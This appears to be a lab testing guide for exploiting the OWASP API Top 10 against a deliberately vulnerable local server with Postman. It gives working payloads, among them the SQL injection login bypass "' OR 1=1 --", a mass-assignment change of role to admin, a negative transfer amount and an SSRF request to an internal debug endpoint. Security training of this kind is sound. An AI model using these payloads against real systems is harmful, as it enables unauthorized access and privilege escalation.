🧪 TESTING GUIDE
OWASP API Top 10 – Practical Exploitation Guide

This document explains how to test and exploit all 10 OWASP API vulnerabilities using Postman.

🚀 Before You Start

1️⃣ Run the server:

python app.py

2️⃣ Confirm server running at:

http://127.0.0.1:5000

3️⃣ Open Postman.

🔟 API1 – Broken Object Level Authorization (BOLA / IDOR)
🎯 Goal

Access another user’s data by changing object ID.

Step 1

Method: GET
URL:

http://127.0.0.1:5000/user/1

Click Send

Step 2

Change URL:

http://127.0.0.1:5000/user/2

Click Send

If both users' data are accessible without authentication → IDOR confirmed.

📸 Screenshot:

01.1_API1_BOLA.png
01.2_API1_BOLA.png
🔟 API2 – Broken Authentication (SQL Injection)
🎯 Goal

Bypass login using SQL injection.

Method: POST
URL:

http://127.0.0.1:5000/login

Body → raw → JSON:

{
  "username": "' OR 1=1 --",
  "password": "anything"
}

Click Send

If login successful and token returned → SQLi worked.

📸 Screenshot:

02_API2_SQLi.png
🔟 API3 – Mass Assignment (Privilege Escalation)
🎯 Goal

Modify role via JSON injection.

Step 1 – Normal Login

POST /login

{
  "username": "arjit",
  "password": "password"
}

Copy returned token.

Step 2 – Update Profile

Method: PUT
URL:

http://127.0.0.1:5000/update-profile

Headers:

Authorization: Bearer YOUR_TOKEN

Body:

{
  "role": "admin"
}

Click Send

Step 3 – Access Admin

GET:

http://127.0.0.1:5000/admin/dashboard

Use same token.

If access granted → privilege escalation successful.

📸 Screenshots:

03.1_API3_Mass_Assignment.png
03.2_API3_Mass_Assignment.png
03.3_API3_Mass_Assignment.png
🔟 API4 – Unrestricted Resource Consumption
🎯 Goal

Test lack of rate limiting.

Send multiple login requests quickly.

Or use large payload:

{
  "username": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
}

If no blocking or rate limit → resource abuse possible.

📸 Screenshot:

04_API4_Resource_Abuse.png
🔟 API5 – Broken Function Level Authorization
🎯 Goal

Access restricted admin endpoint.

Login as normal user.

Then try:

GET http://127.0.0.1:5000/admin/dashboard

If accessible → broken function-level access control.

📸 Screenshots:

05.1_API5_Admin_Access.png
05.2_API5_Admin_Access.png
🔟 API6 – Business Logic Flaw
🎯 Goal

Exploit negative amount transfer.

Method: POST
URL:

http://127.0.0.1:5000/transfer

Headers:

Authorization: Bearer USER_TOKEN

Body:

{
  "amount": -1000
}

If balance increases or behaves incorrectly → logic flaw confirmed.

📸 Screenshot:

06_API6_Business_Logic.png
🔟 API7 – Server-Side Request Forgery (SSRF)
🎯 Goal

Force server to access internal resource.

Method: POST
URL:

http://127.0.0.1:5000/fetch-url

Body:

{
  "url": "http://127.0.0.1:5000/debug-info"
}

If server fetches internal data → SSRF vulnerability.

📸 Screenshot:

07_API7_SSRF.png
🔟 API8 – Security Misconfiguration
🎯 Goal

Check exposed internal data.

Method: GET

http://127.0.0.1:5000/debug-info

If you see:

SECRET_KEY

debug mode

server info

→ Misconfiguration confirmed.

📸 Screenshot:

08_API8_Misconfig.png
🔟 API9 – Improper Inventory Management
🎯 Goal

Discover outdated API versions.

Method: GET

http://127.0.0.1:5000/api/v1/users

If old version accessible → inventory issue.

📸 Screenshot:

09_API9_Old_Version.png
🔟 API10 – Unsafe Consumption of APIs
🎯 Goal

Test blind trust of external APIs.

Method: POST

http://127.0.0.1:5000/external-data

Body:

{
  "api_url": "https://jsonplaceholder.typicode.com/todos/1"
}

If server trusts external response blindly → unsafe consumption vulnerability.

📸 Screenshot:

10_API10_Unsafe_API.png
🏆 Final Attack Chain Demonstration

Complete exploitation flow:

SQL Injection → Login as admin

IDOR → Enumerate users

Mass Assignment → Change role

Business Logic Abuse

SSRF → Access internal resources
